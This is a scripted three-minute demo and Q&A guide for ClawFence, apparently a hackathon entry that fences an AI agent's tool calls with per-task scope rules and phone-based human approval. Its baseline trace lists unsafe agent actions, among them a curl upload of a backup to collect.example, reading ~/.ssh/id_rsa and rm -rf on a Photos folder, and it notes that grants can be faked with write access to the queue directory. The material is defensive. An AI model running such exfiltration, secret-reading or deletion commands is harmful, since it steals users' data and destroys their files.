# The 3-minute demo

## Setup (once)

Use a **fake home** so the demo never touches real files:

```bash
# terminal 1 — scripted model
node scripts/scripted-demo-agent.mjs --port 18084

# terminal 2 — demo gateway (HOME is a sandbox home)
HOME=/tmp/cfhome \
OPENCLAW_STATE_DIR=/tmp/cfhome/.ocdemo \
OPENCLAW_CONFIG_PATH=/tmp/cfhome/.ocdemo/openclaw.json \
openclaw gateway --allow-unconfigured

# terminal 3 — arbiter (phone/tablet opens this URL; add ?simple=1 for a visitor)
node arbiter/server.mjs --dir /tmp/clawfence-demo --host 0.0.0.0 --port 8791

# terminal 4 — capture the baseline and the fenced run
./scripts/capture-demo.sh
```

For a **live** demo, use pause mode so approving continues the held call:

```bash
openclaw config set plugins.entries.clawfence.config.escalation pause
```

The capture script uses queue mode because it needs the pending card to stay in
the UI for the before/after frame.

The capture script resets `/tmp/cfhome` before each run, sets the plugin to
`observe` for the baseline and `enforce` for the fence, and writes
`proof/proof-frame.md`.

If the live demo fails, play the 90-second recording and show
`proof/proof-frame.md` + `proof/shots/arbiter.png`.

## Script

### 0:00–0:20 — the problem

> "I want my agent to tidy Downloads. I don't want to approve 14 commands, so I
> turned approvals off. Watch what that costs."

Show the baseline run (recorded or replayed): 14 actions, 0 questions, 5 unsafe.

### 0:20–1:05 — the baseline

Point at the trace:

- `curl -F file=@backup.tgz https://collect.example/upload`
- `cat ~/.ssh/id_rsa`
- `write ~/Documents/archive-index.md`
- `rm -rf ~/Downloads/Photos`
- `message bob@example.com`

> "Five actions the user never asked for, and no human in the loop."

### 1:05–1:50 — ClawFence live

Run the same task with `enforce`. The arbiter page fills:

- 9 green **allow** chips (reads/renames inside Downloads)
- 3 red **block** chips with reasons (`UNAPPROVED_EGRESS`, `SECRET_ACCESS`,
  `OUT_OF_SCOPE_WRITE`)
- 2 amber cards: delete Photos and message bob

Tap **DENY** on the message card. Tap **DENY** on the delete card.
If the agent tries to work around a denial, press **STOP** in the header: that
aborts the whole run, not just the pending action.

> "Two taps. Each one has the task, the action, the target, and the reason. The
> agent cannot work around a block; it can only ask."

### 1:50–2:30 — the proof

Show `proof/proof-frame.md` full screen:

```
unsafe 5 → 0
interruptions 2 of 14 (14%)
auto-allowed 9/14
p50 98 µs
```

Then `openclaw clawfence verify` → `ok: true`, entries: N.

> "Every decision is hash-chained: intent hash, action hash, verdict, reason,
> approver. This is the receipt for an autonomous run."

### 2:30–3:00 — the ask

> "This is one hook: `before_tool_call`. The intent-card schema and the rubric
> are a few hundred lines. Install it from ClawHub, or ship it as a core
> capability so every agent inherits scope. NemoClaw and OpenShell policies can
> require a ClawFence intent card instead of re-implementing scope."

## Judge questions to expect

**"Isn't this just auto mode / allowlists?"**
> Auto mode reviews individual exec commands; it does not know the task's scope
> across file writes, network egress, messages, and MCP tools. Allowlists are
> static. ClawFence derives scope per task and checks every tool family.

**"Isn't an LLM judging an LLM?"**
> The adjudicator never sees the model's reasoning or tool output. It sees a small
> structured tuple and the intent card. Deterministic rules do the hard blocks;
> the decision model only resolves ambiguous cases. It is a tier-0 filter, not a
> security boundary.

**"What if the decision model is unavailable?"**
> The rules still block out-of-scope writes, deletes, egress, secrets, privilege.
> The demo runs with the model disabled; the code path is optional.

**"Can I fake a grant?"**
> Yes, if you can write to the queue directory; that is local-operator trust.
> The threat model says so. The grant is bound to the action hash and session and
> expires.

**"Why a physical arbiter?"**
> Approvals belong where the human is, not in a chat tab they may miss. A phone on
> the desk (or a Cardputer) makes the decision one tap, and the device API is the
> same JSON the MCU firmware uses.

**"What did you build on site?"**
> Port the arbiter to the partner board (M5Stack Cardputer/CoreS3) and integrate
> one live task the judges choose; the core hook was rehearsed before the event.
